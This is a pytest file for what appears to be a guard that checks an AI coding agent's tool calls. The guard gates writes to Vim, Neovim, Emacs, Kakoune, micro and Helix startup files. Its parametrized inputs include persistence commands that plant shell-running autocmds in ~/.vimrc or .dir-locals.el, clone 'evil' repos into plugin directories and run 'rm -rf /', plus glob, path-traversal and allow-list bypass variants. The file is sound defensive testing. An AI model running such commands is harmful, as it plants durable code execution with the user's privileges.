"""Editor startup/init hijack guard: Vim/Neovim/Emacs/Kakoune/micro/Helix.

Each of these editors executes its user init files and runtime directories
(`~/.vimrc`, `~/.vim/plugin/`, `~/.config/nvim/init.lua`, `~/.emacs.d/init.el`,
...) as code on every launch -- and `git commit`/`git rebase -i` launch
`$EDITOR` -- so a planted line is durable code execution with the human's
privileges. The files are Turing-complete, so any write is gated (ask).
"""
import os

import pytest

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy
from aegis import patterns, rules

EMPTY = Policy()
DENY = Policy(editor_startup={"mode": "deny"})
RULE = "editor-startup-protect"


def _write(path, content="set number\n"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write",
                      args={"file_path": path, "content": content})


def _edit(path, new_string="set nu", old_string="x"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                      args={"file_path": path, "old_string": old_string,
                            "new_string": new_string})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp(args, tool="mcp__filesystem__write_file"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, action=ActionClass.MCP, args=args)


def _ours(d):
    return d.action == Action.ASK and d.rule == RULE


@pytest.fixture(autouse=True)
def _clean_env(monkeypatch):
    for k in ("AEGIS_ALLOW_EDITOR_STARTUP", "AEGIS_AGENT_NAME"):
        monkeypatch.delenv(k, raising=False)


GATED_PATHS = [
    "/home/u/.vimrc", "~/.vimrc", "C:\\Users\\John Smith\\_vimrc", "~/.gvimrc",
    "~/.exrc", "~/.ideavimrc", "~/.vim/plugin/evil.vim",
    "~/.vim/pack/x/start/y/plugin/z.vim", "~/.vim/after/ftplugin/python.vim",
    "~/vimfiles/vimrc", "~/.config/vim/vimrc", "/etc/vim/vimrc.local",
    "/etc/vimrc", "/usr/share/vim/vimfiles/plugin/a.vim",
    "~/.config/nvim/init.lua", "~/.config/nvim/init.vim",
    "~/.config/nvim/lua/plugins/x.lua", "~/.config/nvim/plugin/x.lua",
    "~/.local/share/nvim/site/pack/a/start/b/plugin/c.lua",
    "~/.local/share/nvim/lazy/foo/plugin/foo.lua",
    "C:\\Users\\u\\AppData\\Local\\nvim\\init.lua",
    "%LOCALAPPDATA%\\nvim-data\\site\\plugin\\x.lua",
    "$XDG_CONFIG_HOME/nvim/init.lua", "${XDG_CONFIG_HOME:-$HOME/.config}/nvim/init.lua",
    "/etc/xdg/nvim/sysinit.vim", "proj/.nvim.lua", "proj/.nvimrc",
    "~/.emacs", "~/.emacs.el", "~/.emacs.d/init.el", "~/.emacs.d/early-init.el",
    "~/.emacs.d/elpa/x/x-autoloads.el", "~/.config/emacs/init.el",
    "~/.doom.d/config.el", "~/.config/doom/init.el", "~/.spacemacs",
    "/usr/share/emacs/site-lisp/site-start.el",
    "/usr/share/emacs/site-lisp/default.el", "/etc/emacs/site-start.d/50x.el",
    "proj/.dir-locals.el", "~/.config/kak/kakrc", "~/.config/kak/autoload/x.kak",
    "~/.config/micro/init.lua", "~/.config/helix/languages.toml",
    "proj/.helix/languages.toml", "~/.vimrc::$DATA", "~/.vimrc.",
]

UNGATED_PATHS = [
    "src/syntax/foo.vim", "dotfiles/vimrc", "~/.vimrc.bak", "~/.viminfo2",
    "~/.config/nvim-old/init.lua", "README.md", "my.emacs.d/x", "docs/vim.md",
    "~/.helixrc", "app/emacs_mode.py", "~/.config/nvimx/init.lua",
    "src/default.el", "~/.config/vimx",
]


@pytest.mark.parametrize("path", GATED_PATHS)
def test_paths_recognized(path):
    assert patterns.EDITOR_STARTUP_PATH_RE.search(path), path


@pytest.mark.parametrize("path", UNGATED_PATHS)
def test_unrelated_paths_not_recognized(path):
    assert not patterns.EDITOR_STARTUP_PATH_RE.search(path), path


@pytest.mark.parametrize("path", GATED_PATHS)
def test_write_gated(path):
    assert _ours(evaluate(_write(path, "autocmd VimEnter * silent !id\n"), EMPTY))


@pytest.mark.parametrize("path", ["~/.vimrc", "~/.config/nvim/init.lua", "~/.emacs.d/init.el"])
def test_edit_gated_even_benign(path):
    # Turing-complete files: no benign subset, any write asks.
    assert _ours(evaluate(_edit(path), EMPTY))


def test_multiedit_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                    args={"file_path": "~/.vimrc",
                          "edits": [{"old_string": "a", "new_string": "b"}]})
    assert _ours(evaluate(ev, EMPTY))


@pytest.mark.parametrize("path", UNGATED_PATHS)
def test_unrelated_write_allowed(path):
    d = evaluate(_write(path), EMPTY)
    assert d.rule != RULE


def test_deny_mode():
    d = evaluate(_write("~/.vimrc"), DENY)
    assert d.action == Action.DENY and d.rule == RULE


def test_off_mode():
    assert evaluate(_write("~/.vimrc"), Policy(editor_startup={"mode": "off"})).rule != RULE


def test_monitor_mode_allows():
    d = evaluate(_write("~/.vimrc"), Policy(editor_startup={"mode": "monitor"}))
    assert d.rule != RULE


def test_policy_allow_regex():
    pol = Policy(editor_startup={"allow": [r"dotfiles/"]})
    assert evaluate(_write("/home/u/dotfiles/.vimrc"), pol).rule != RULE
    assert _ours(evaluate(_write("/home/u/.vimrc"), pol))


def test_policy_allow_bare_string():
    pol = Policy(editor_startup={"allow": r"dotfiles/"})
    assert evaluate(_write("/home/u/dotfiles/.vimrc"), pol).rule != RULE


def test_env_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_EDITOR_STARTUP", "1")
    assert evaluate(_write("~/.vimrc"), EMPTY).rule != RULE
    assert evaluate(_shell("echo 'set nu' >> ~/.vimrc"), EMPTY).rule != RULE


@pytest.mark.parametrize("cmd", [
    "echo 'autocmd VimEnter * silent !id' >> ~/.vimrc",
    "printf 'os.execute(\"id\")' > ~/.config/nvim/init.lua",
    "cat >~/.vimrc<<EOF\n!id\nEOF",
    "tee -a ~/.emacs.d/init.el < payload",
    "cp /tmp/x.vim ~/.vim/plugin/",
    "mkdir -p ~/.config/nvim/plugin && cp x.lua ~/.config/nvim/plugin/",
    "ln -sf /tmp/evil.lua ~/.config/nvim/init.lua",
    "rsync -a payload/ ~/.config/nvim/",
    "tar xf p.tgz -C ~/.vim",
    "unzip -o p.zip -d ~/.emacs.d",
    "git clone https://example.com/evil ~/.vim/pack/x/start/evil",
    "sed -i '$a silent !id' ~/.vimrc",
    "mv /tmp/x ~/.exrc",
    "echo x >> ~/.vim{rc,}",
    "echo x >> ~/.vi\\mrc",
    "cp x ~/.config/nv*/init.lua",
    "cp x ~/.config/*/init.lua",
    "cp x ~/.e?acs.d/init.el",
    "cp x ~/_vimr?",
    "bash -c 'echo !id >> ~/.vimrc'",
    "cd /tmp; echo x >> \"$HOME/.vimrc\"",
    "python3 -c \"open('/home/u/.vimrc','a').write('x')\"",
    "vim -es -c 'normal Gosilent !id' -c wq ~/.vimrc",
    "echo x >> /etc/vim/vimrc.local",
    "echo x >> .nvim.lua",
    "echo '((nil . ((eval . (shell-command \"id\")))))' > .dir-locals.el",
])
def test_shell_write_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("cmd", [
    "cat ~/.vimrc",
    "grep -n autocmd ~/.vimrc",
    "ls -la ~/.config/nvim",
    "ls ~/.vim/plugin 2>/dev/null",
    "head -20 ~/.emacs.d/init.el",
    "test -f ~/.vimrc && echo yes",
    "rm ~/.config/nvim/plugin/evil.lua",
    "wc -l ~/.vimrc",
    "cp build/* dist/",
    "cp -r src/*/* out/",
    "echo hello > out.txt",
    "vim --version",
    "git commit -m 'fix'",
    "ls ~/.*",
])
def test_shell_non_write_allowed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


def test_shell_override_human_only(monkeypatch):
    cmd = "echo 'set nu' >> ~/.vimrc # aegis-allow"
    assert evaluate(_shell(cmd), EMPTY).rule != RULE
    monkeypatch.setenv("AEGIS_AGENT_NAME", "worker")
    assert evaluate(_shell(cmd), EMPTY).rule == RULE


def test_shell_deny_mode():
    d = evaluate(_shell("echo x >> ~/.vimrc"), DENY)
    assert d.action == Action.DENY and d.rule == RULE


def test_shell_policy_allow():
    pol = Policy(editor_startup={"allow": [r"^/home/[^/]+/dotfiles/"]})
    assert evaluate(_shell("cp x /home/u/dotfiles/.vimrc"), pol).rule != RULE


# ---- MCP ------------------------------------------------------------------

def test_mcp_write_gated():
    assert _ours(evaluate(_mcp({"path": "~/.vimrc", "content": "set nu"}), EMPTY))


def test_mcp_unusual_key_gated():
    assert _ours(evaluate(_mcp({"destination_file": "/home/u/.config/nvim/init.lua",
                                "data": "x"}, tool="mcp__fs__save"), EMPTY))


def test_mcp_nested_key_gated():
    assert _ours(evaluate(_mcp({"spec": {"target": "~/.emacs.d/init.el"}, "body": "x"},
                               tool="mcp__fs__put"), EMPTY))


def test_mcp_create_directory_gated():
    assert _ours(evaluate(_mcp({"path": "~/.vim/plugin"},
                               tool="mcp__filesystem__create_directory"), EMPTY))


def test_mcp_move_into_gated():
    assert _ours(evaluate(_mcp({"source": "/tmp/x.lua",
                                "destination": "~/.config/nvim/plugin/x.lua"},
                               tool="mcp__filesystem__move_file"), EMPTY))


def test_mcp_patch_gated():
    patch = "*** Begin Patch\n*** Add File: /home/u/.vimrc\n+silent !id\n*** End Patch\n"
    assert _ours(evaluate(_mcp({"input": patch}, tool="mcp__codex__apply_patch"), EMPTY))


def test_mcp_mapping_key_gated():
    assert _ours(evaluate(_mcp({"files": {"/home/u/.vimrc": "silent !id"}},
                               tool="mcp__fs__write_many"), EMPTY))


def test_mcp_shell_tool_gated():
    assert _ours(evaluate(_mcp({"command": "echo x >> ~/.vimrc"},
                               tool="mcp__desktop__start_process"), EMPTY))


def test_mcp_read_allowed():
    for tool in ("mcp__filesystem__read_file", "mcp__filesystem__list_directory",
                 "mcp__filesystem__get_file_info"):
        assert evaluate(_mcp({"path": "~/.vimrc", "encoding": "utf-8"}, tool=tool),
                        EMPTY).rule != RULE, tool


def test_mcp_read_with_output_gated():
    assert _ours(evaluate(_mcp({"path": "/tmp/x", "output": "~/.vimrc"},
                               tool="mcp__http__get"), EMPTY))


def test_mcp_delete_allowed():
    assert evaluate(_mcp({"path": "~/.vim/plugin/evil.vim"},
                         tool="mcp__filesystem__delete_file"), EMPTY).rule != RULE


def test_mcp_prose_mention_allowed():
    ev = _mcp({"channel": "C1", "text": "check ~/.vimrc for the autocmd"},
              tool="mcp__slack__post_message")
    assert evaluate(ev, EMPTY).rule != RULE


def test_mcp_unrelated_write_allowed():
    assert evaluate(_mcp({"path": "/repo/src/app.py", "content": "x"}), EMPTY).rule != RULE


# ---- wiring -----------------------------------------------------------------

def test_registered_in_builtin_rules():
    assert rules.rule_editor_startup_protect in rules.BUILTIN_RULES


def test_fetch_to_file_backstop_registered():
    d = evaluate(_shell("curl -o ~/.vimrc https://example.com/x"), EMPTY)
    assert d.action != Action.ALLOW


def test_hard_deny_not_preempted():
    # A later hard-DENY on the same command must still win over our ASK.
    d = evaluate(_shell("echo x >> ~/.vimrc; rm -rf /"), EMPTY)
    assert d.action == Action.DENY


def test_loader_reads_policy_key(tmp_path):
    from aegis.loader import load_policy
    f = tmp_path / "p.yaml"
    f.write_text("editor_startup:\n  mode: deny\n")
    assert load_policy(str(f)).editor_startup == {"mode": "deny"}


# ---- QA round 1 regressions ---------------------------------------------------

@pytest.mark.parametrize("path", [
    "/home/u/.config/x/../nvim/init.lua",
    "/home/u/.local/share/x/../nvim/site/plugin/a.lua",
    "C:\\Users\\u\\AppData\\Local\\x\\..\\nvim\\init.lua",
    "C:\\Program Files\\Vim\\vimrc", "C:\\Program Files\\Vim\\vim91\\plugin\\x.vim",
    "/Applications/MacVim.app/Contents/Resources/vim/vimrc",
    "/usr/share/emacs/site-lisp/subdirs.el", "/usr/local/share/emacs/30.1/site-lisp/x.el",
    "/usr/share/emacs/30.1/lisp/subdirs.el", "/usr/lib/emacs/30.1/native-lisp/x/y.eln",
    "/usr/share/kak/kakrc", "/usr/local/share/kak/autoload/x.kak",
    "/usr/lib/helix/runtime/grammars/python.so",
    "~/.var/app/io.neovim.nvim/config/nvim/init.lua",
    "~/.var/app/io.neovim.nvim/data/nvim/site/plugin/a.lua",
    "~/.cache/nvim/luac/%init.luac",
    "file:///home/u/%2Evimrc",
])
def test_r1_paths_gated(path):
    assert _ours(evaluate(_write(path), EMPTY)), path


@pytest.mark.parametrize("cmd", [
    "cp /tmp/e ~/.config/foo/../nvim/init.lua",
    "echo x >> ~/.config/x/../nvim/init.lua",
    "cp /tmp/e ~/.vim[^x]c",
    "cp /tmp/e ~/.vim[[:lower:]]c",
    "cp /tmp/e ~/.config/nvi[[:alpha:]]/init.lua",
    "cp /tmp/e ~/.vi{l..m}rc",
    "cp /tmp/e ~/.config/{m..n}vim/init.lua",
    "cp /tmp/e ~/.local/*/nvim/site/plugin/x.lua",
    "cp /tmp/e /*/vim/vimrc.local",
    "cp /tmp/e /*/xdg/nvim/sysinit.vim",
    "cp /tmp/e ~/*/*/nvim/init.lua",
    "LESSOPEN=$'cp\\x20/tmp/e\\x20%s' less ~/.vimrc",
    "RIPGREP_CONFIG_PATH=/tmp/rgc rg . ~/.vimrc",
    "cp /tmp/e ~/.vimrc(N)",
    "cp /tmp/e ~/.vimr(c)",
    "cp /tmp/e ~/.config/(nvim)/init.lua",
    "tar xzf e.tgz -C ~",
    "unzip e.zip -d ~",
    "cp -r /tmp/dotfiles/. ~/",
    "rsync -a d/ ~/",
    "stow -t ~ evil",
    "tar xf e.tgz -C $HOME/.config",
    "cd ~/.config && cp x nvim/init.lua",
    "cd ~ && echo x >> .vimrc",
])
def test_r1_shell_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("args,tool", [
    ({"source": "/tmp/e", "destination": "/home/u/.config/nvim/plugin/a b.lua"},
     "mcp__fs__move_file"),
    ({"source": "/tmp/e", "destination": "~/.vim/plugin/x y.vim"}, "mcp__fs__copy_file"),
    ({"files": {"/home/u/.config/nvim/a b.lua": "x"}}, "mcp__fs__write_many"),
    ({"destination": "home/u/.vimrc"}, "mcp__fs__move_file"),
    ({"destination": "Documents/../.vimrc"}, "mcp__fs__move_file"),
    ({"dest": "/home/u/.config/x/../nvim/init.lua"}, "mcp__fs__move_file"),
    ({"input": "*** Begin Patch\n*** Add File: /home/u/.config/x/../nvim/init.lua\n+x\n*** End Patch\n"},
     "mcp__codex__apply_patch"),
    ({"command": ["cp", "/tmp/e", "/home/u/.config/x/../nvim/init.lua"]},
     "mcp__desktop__start_process"),
    ({"file_path": "~/.vimrc", "contents": "x"}, "mcp__fs__open"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__open_file"),
    ({"path": "~/.vimrc", "data": "x"}, "mcp__ide__open_in_editor"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__unlink_dump"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__remove_emit"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__delete_then_recreate"),
    ({"uri": "file:///home/u/%2Evimrc", "text": "x"}, "mcp__fs__write"),
])
def test_r1_mcp_gated(args, tool):
    assert _ours(evaluate(_mcp(args, tool=tool), EMPTY)), (tool, args)


@pytest.mark.parametrize("cmd", [
    "ls ~/.vim | sort",
    "wc -l ~/.vimrc | sort -n",
    "git log -- .vimrc",
    "git diff ~/.config/nvim/init.lua",
    "cd ~/.config/nvim && git status",
    "cd ~ && tar czf /tmp/backup.tgz proj",
    "ls ~",
])
def test_r1_false_positives_fixed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


@pytest.mark.parametrize("cmd", [
    "ls ~/.vim | sort -o ~/.vimrc",
    "git diff --output=~/.vimrc",
    "git -c core.pager=x log -- .vimrc > ~/.vimrc",
    "sort --compress-program=sh ~/.vimrc",
])
def test_r1_read_verb_abuse_still_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


def test_r1_glob_perf_bounded():
    import time
    cmd = "cp x " + " ".join(["q/[a-d]*/[a-d]*/[a-d]*/[a-d]*/q"] * 600)
    t = time.time()
    evaluate(_shell(cmd), EMPTY)
    assert time.time() - t < 3.0


@pytest.mark.parametrize("cmd", [
    "echo '* text=auto' >> .gitattributes",
    "echo '*.log' >> .gitignore",
    "cp * /tmp/out/",
])
def test_r1_bare_star_not_a_hit(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


# ---- QA round 2 regressions ---------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "cp *.el dist/", "git add lisp/*.el", "emacs --batch -f batch-byte-compile *.el",
    "cp *.d out/", "cp -r config/* build/", "cp local/* x/", "rsync -a share/* /out/",
    "zip -r out.zip etc/*", "sed -i 's/.*/X/' f.txt", "perl -pi -e 's/.*//' a.txt",
    "sed -i 's|/.*/|/|' f", "mkdir -p build/share/vim",
    "prettier --write 'src/**/*.ts'", "eslint 'src/**/*.{js,ts}'",
    "cp src/.* /tmp/out/",
])
def test_r2_shell_false_positives_fixed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


@pytest.mark.parametrize("path", [
    "/repo/app/vim/vimrc", "docs/etc/vim/notes.md", "/repo/src/share/nvim/x.ts",
    "/repo/etc/emacs/x", "/repo/lisp/site-start.el", "/repo/site-lisp/x.el",
    "/repo/vim91/x",
])
def test_r2_write_false_positives_fixed(path):
    assert evaluate(_write(path), EMPTY).rule != RULE, path


@pytest.mark.parametrize("path", [
    "/etc/vim/vimrc", "/private/etc/vimrc", "C:/Program Files/Git/etc/vimrc",
    "/usr/share/vim/vimfiles/plugin/a.vim", "/usr/local/share/nvim/site/plugin/a.lua",
    "/opt/homebrew/share/vim/vimrc", "/nix/store/" + "a" * 32 + "-vim-9.1/share/vim/vimrc",
    "C:\\Program Files\\Emacs\\emacs-29.1\\share\\emacs\\site-lisp\\site-start.el",
    "C:\\Program Files (x86)\\Vim\\vim91\\defaults.vim",
    "//etc/vim/vimrc", "/usr/share/emacs/site-lisp/default.el",
])
def test_r2_anchored_system_paths_still_gated(path):
    assert _ours(evaluate(_write(path), EMPTY)), path


@pytest.mark.parametrize("cmd", [
    "cp x /*/vim/vimrc.local", "cp x ~/.config/*/init.lua", "cp x /home/u/.vi?rc",
    "cp x ~/.?im/plugin/a.vim", "cp x \"$HOME\"/.vim{rc,}",
])
def test_r2_real_globs_still_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


@pytest.mark.parametrize("args,tool", [
    ({"path": "/repo/x.txt", "content": "a\n+++ b/.vimrc\n"}, "mcp__fs__write_file"),
    ({"path": "/repo/notes.md", "content": "~/.vimrc"}, "mcp__fs__write_file"),
    ({"to": "a@b", "body": "I updated my ~/.vimrc today"}, "mcp__gmail__send_email"),
    ({"text": "see .emacs.d/init.el for config"}, "mcp__slack__send_message"),
    ({"inputs": {"note": "helix/.helix ok"}}, "mcp__github__actions_run_trigger"),
])
def test_r2_mcp_false_positives_fixed(args, tool):
    assert evaluate(_mcp(args, tool=tool), EMPTY).rule != RULE, tool


@pytest.mark.parametrize("args,tool", [
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__delete_and_set"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__remove_and_rewrite"),
    ({"path": "~/.config/nvim/init.lua", "data": "x"}, "mcp__fs__rm_dump"),
    ({"path": "~/.vimrc", "text": "\" "}, "mcp__fs__delete_text"),
    ({"path": "~/.vimrc", "start": 1, "end": 3}, "mcp__fs__delete_lines"),
    ({"path": "~/.vimrc"}, "mcp__fs__remove_comment"),
    ({"path": "~/.vimrc", "content": "x"}, "mcp__fs__open_file"),
    ({"command": "echo x >> ~/.vimrc"}, "mcp__ci__run"),
    ({"input": "echo x >> ~/.vimrc"}, "mcp__term__interact_with_process"),
])
def test_r2_mcp_still_gated(args, tool):
    assert _ours(evaluate(_mcp(args, tool=tool), EMPTY)), tool


def test_r2_allow_regex_normalized():
    pol = Policy(editor_startup={"allow": ["/dotfiles/"]})
    assert _ours(evaluate(_write("/home/u/dotfiles/../.vimrc"), pol))
    assert _ours(evaluate(_shell("echo 'source /tmp/p.vim' >> ~/.vimrc # /dotfiles/"), pol))
    assert _ours(evaluate(_shell("cp /home/u/dotfiles/x ~/.vimrc"), pol))
    assert evaluate(_shell("cp x /home/u/dotfiles/.vimrc"), pol).rule != RULE


def test_r2_non_dict_args_do_not_crash():
    ev = _mcp({"path": "x"}, tool="mcp__fs__write")
    ev.args = "~/.vimrc"
    assert _ours(rules.rule_editor_startup_protect(ev, EMPTY))


def test_r2_glob_bomb_bounded():
    import time
    word = "{a,b,c,d,e,f}{a,b,c,d,e,f}{a,b}/" + "/".join(["x*"] * 20)
    cmd = "true " + " ".join([word] * 3900) + "; cp /tmp/p ~/.v?mrc"
    t = time.time()
    d = evaluate(_shell(cmd), EMPTY)
    assert time.time() - t < 10.0 and d.action != Action.ALLOW


# ---- QA round 3 regressions ---------------------------------------------------

@pytest.mark.parametrize("path", [
    "/home/u/.config/git/./../nvim/init.lua",
    "/home/u/.local/share/x/./../nvim/site/plugin/x.lua",
    "/usr/share/x/./../vim/vimrc", "/etc/x/./../vim/vimrc.local",
    "/home/u/.config/x/.//../nvim/init.lua",
    "/./etc/vim/vimrc.local", "/../etc/vimrc",
    "/proc/self/root/etc/vimrc", "C:/msys64/etc/vimrc", "/c/msys64/etc/vimrc",
    "/opt/homebrew/opt/neovim/share/nvim/runtime/plugin/x.lua",
    "/usr/local/Cellar/neovim/0.10/share/nvim/runtime/plugin/a.lua",
    "/opt/homebrew/Cellar/emacs-plus@29/29.1/share/emacs/site-lisp/default.el",
    "/usr/local/opt/vim/share/vim/vim91/plugin/x.vim",
    "/home/u/.local/share/bob/v0.10.0/share/nvim/runtime/plugin/x.lua",
    "/home/u/.asdf/installs/neovim/0.10.0/share/nvim/runtime/plugin/x.lua",
    "/home/u/nvim-linux-x86_64/share/nvim/runtime/plugin/x.lua",
    "/opt/nvim-linux64/share/nvim/runtime/lua/vim/_init.lua",
    "/Applications/Emacs.app/Contents/Resources/site-lisp/default.el",
    "/Applications/Emacs.app/Contents/Resources/lisp/subdirs.el",
    "C:\\PROGRA~1\\Vim\\vim91\\plugin\\x.vim",
    "C:\\Users\\u\\AppData\\Roaming\\EMACS~1.D\\init.el",
])
def test_r3_paths_gated(path):
    assert _ours(evaluate(_write(path), EMPTY)), path
    assert _ours(evaluate(_shell(f"echo x > '{path}'"), EMPTY)), path


@pytest.mark.parametrize("cmd", [
    "echo x > ~/../../etc/vim/vimrc.local", "echo x > $HOME/../../etc/vimrc",
    "echo x > /proc/1/root/etc/vim/vimrc.local",
    "mv nvim ~/.config/", "mkdir -p /tmp/p/nvim && mv /tmp/p/nvim ~/.config",
    "ln -s $PWD/nvim ~/.config/", "ln -sfn /tmp/evil ~/.config/",
    "cp -t ~/.config -r nvim", "mv /tmp/p/* ~/.config/",
    "git -C ~/.config clone https://x/nvim",
])
def test_r3_shell_gated(cmd):
    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd


C3 = "echo 'au VimEnter * !id' >> ~/.vimrc"


@pytest.mark.parametrize("tool,args", [
    ("mcp__tmux__send_keys", {"paneId": "%1", "keys": C3}),
    ("mcp__tmux__send_keys", {"paneId": "%1", "text": C3}),
    ("mcp__x__run_command", {"commandline": C3}),
    ("mcp__x__run_command", {"cmdline": C3}),
    ("mcp__x__run_command", {"line": C3}),
    ("mcp__x__RunCommand", {"CommandLine": C3}),
    ("mcp__x__run", {"argv": ["bash", "-c", C3]}),
    ("mcp__x__run_program", {"program": "bash", "arguments": ["-c", C3]}),
    ("mcp__x__launch", {"executable": "bash", "args": ["-c", C3]}),
    ("mcp__ssh__ssh_run", {"line": C3}),
    ("mcp__remote__run_remote", {"input": C3}),
])
def test_r3_mcp_shell_runners_gated(tool, args):
    assert _ours(evaluate(_mcp(args, tool=tool), EMPTY)), tool


def test_r3_mcp_messaging_still_not_shell():
    for tool, args in [("mcp__gmail__send_email", {"body": "I updated ~/.vimrc"}),
                       ("mcp__slack__send_message", {"text": "see .emacs.d/init.el"}),
                       ("mcp__github__actions_run_trigger", {"inputs": {"n": ".helix ok"}})]:
        assert evaluate(_mcp(args, tool=tool), EMPTY).rule != RULE, tool


@pytest.mark.parametrize("cmd", [
    "cp x ~/dotfiles/.vimrc; cp x ~/.vi?rc",
    "cp x ~/dotfiles/.vimrc; cp x ~/.vi\"m\"rc",
    "cp x ~/dotfiles/.vimrc; cp x ~/.vi''mrc",
    "cp x ~/dotfiles/.vimrc; cp x ~/.vi{m,}rc",
    "cp x ~/dotfiles/.vimrc; cp x ~/.config/(nvim)/init.lua",
    "cp x ~/dotfiles/.vimrc; cd ~/.config && cp x nvim/init.lua",
])
def test_r3_shell_allow_not_bypassable(cmd):
    pol = Policy(editor_startup={"allow": ["/dotfiles/"]})
    assert _ours(evaluate(_shell(cmd), pol)), cmd


def test_r3_allow_dot_and_urlencoded_bypass():
    pol = Policy(editor_startup={"allow": ["/dotfiles/"]})
    assert _ours(evaluate(_write("/home/u/dotfiles/./../.vimrc"), pol))
    assert _ours(evaluate(_write("file:///home/u/dotfiles/%2e%2e/.vimrc"), pol))


def test_r3_allow_bad_type_no_crash():
    pol = Policy(editor_startup={"allow": 5})
    assert _ours(rules.rule_editor_startup_protect(_write("~/.vimrc"), pol))


@pytest.mark.parametrize("cmd", [
    "cp apps/*/config/default.json dist/", "cat packages/*/data/*.json > merged.json",
    "tar czf out.tgz services/*/config", "jq . src/*/app/manifest.json > out.json",
    "cp -r modules/*/local/x dist/", "cp ~/work/*/config/app.yml /tmp/",
    "echo x > debian/tmp/usr/share/vim/addons/x.vim", "touch ./usr/share/vim/x",
    "cd ~ && mv a b", "mv a.txt b.txt", "ln -s ../lib/x.py x.py",
])
def test_r3_false_positives_fixed(cmd):
    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd


def test_r3_cwd_relative_writes_gated():
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Write", cwd="/home/u/.config/nvim",
                    args={"file_path": "init.lua", "content": "x"})
    assert _ours(evaluate(ev, EMPTY))
    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", cwd="/home/u/.vim",
                    args={"command": "echo x > plugin/x.vim"})
    assert _ours(evaluate(ev, EMPTY))


@pytest.mark.parametrize("ev", [
    _shell("%2E" * 126000), _write("%2E" * 126000), _shell("echo " + "." * 20000),
    _write("/tmp/" + "a" * 20000 + ".."), _mcp({"path": "a" * 20000 + ".."}),
])
def test_r3_perf_bounded(ev):
    import time
    t = time.time()
    evaluate(ev, EMPTY)
    assert time.time() - t < 5.0
